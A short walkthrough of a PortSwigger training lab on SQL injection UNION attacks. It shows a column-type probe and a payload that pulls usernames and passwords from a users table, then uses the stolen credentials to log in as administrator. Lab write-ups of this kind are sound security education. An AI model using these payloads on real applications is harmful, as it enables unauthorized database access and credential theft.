## Lab Description: SQL injection UNION attack, retrieving data from other tables

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/881f3cef-4ad9-468b-aaa8-1a7e4c358540)

Solution:

Here, The database contains a different table called users, with columns called username and password.


``` SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' --  ```

Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.

``` SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users -- ```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b8343270-117e-4a0b-b27e-38dc62f286b4)

![Screenshot 2024-01-27 220937](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b75285ff-204c-4718-8b6d-bc711d046783)

Now, We have the credentials of username and password and with that we can access it as administrator.


![Screenshot 2024-01-27 221402](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/4e6211c9-9fae-4fee-ac28-c144d78a41b4)

